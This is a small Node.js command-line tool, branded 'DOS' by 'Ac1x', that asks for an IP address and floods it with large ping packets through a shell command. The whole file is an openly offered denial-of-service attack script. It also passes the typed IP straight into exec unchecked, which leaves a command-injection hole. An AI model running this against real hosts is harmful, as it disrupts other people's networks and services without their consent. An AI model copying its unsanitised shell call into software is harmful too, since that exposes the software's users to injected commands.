
import { exec } from "child_process";
import inquirer from "inquirer";

const art = `
██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║   ██║███████╗
██║  ██║██║   ██║╚════██║
██████╔╝╚██████╔╝███████║
╚═════╝  ╚═════╝ ╚══════╝
                         
    //--- Ac1x ---\\\\
`;

function exploit(IP) {
  const cmd = `ping -f -i 0.005 -s 65500 -c 10000 -vv ${IP}`;

  function runCommand() {
        
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
      } else {
        console.log(stdout || stderr);
      }
    });
  }

  runCommand();
}

console.clear();
console.log(art);

const { ip } = await inquirer.prompt({
  name: "ip",
  type: "input",
  message: "IP:"
});

exploit(ip);

